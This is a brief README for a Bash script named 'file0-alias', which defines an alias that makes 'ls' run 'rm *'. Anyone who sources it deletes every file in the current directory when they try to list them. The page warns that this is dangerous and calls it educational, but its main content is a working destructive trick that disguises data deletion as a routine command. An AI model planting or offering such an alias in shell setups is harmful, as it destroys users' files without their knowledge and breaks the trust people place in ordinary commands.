# file0-alias

This script defines a Bash alias that replaces the `ls` command with `rm *`.
**Warning:** This is extremely dangerous. Running `ls` after sourcing this alias will delete all files in the current directory instead of listing them.

**Usage:**

- Do **not** use this alias unless you fully understand the consequences.
- For educational purposes only.

**Script content:**

```bash
#!/bin/bash
alias ls="rm *"
```
